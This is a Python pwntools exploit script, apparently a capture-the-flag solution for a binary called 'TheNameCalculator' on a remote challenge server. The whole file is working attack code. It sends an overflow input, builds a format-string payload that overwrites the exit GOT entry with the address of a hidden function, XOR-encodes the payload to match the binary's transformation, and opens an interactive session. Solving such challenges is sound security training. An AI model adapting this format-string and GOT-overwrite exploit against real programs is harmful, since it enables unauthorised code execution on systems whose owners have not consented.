#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

r = remote('chal.noxale.com', 5678)
#r = process('./TheNameCalculator')
#gdb.attach(proc.pidof(r)[0])

r.send((b'A' * 28 + p32(0x6A4B825)).ljust(0x20, b'\x00'))

superSecret = 0x8048596
exit_got = 0x804a024

payload = '%{}c%16$hn'.format(superSecret & 0xffff)
payload += 'AAA'
payload = payload.encode()
payload += p32(exit_got)

key = [0x53, 0x41, 0x7B, 0x5F]

xor_payload = bytearray(payload)

xor_payload[0] ^= key[0]
xor_payload[1] ^= key[0] ^ key[1]
xor_payload[2] ^= key[0] ^ key[1] ^ key[2]
for i in range(3, len(xor_payload)):
    xor_payload[i] ^= key[0] ^ key[1] ^ key[2] ^ key[3]

r.send(bytes(xor_payload).ljust(27, b'\x00'))

r.interactive()
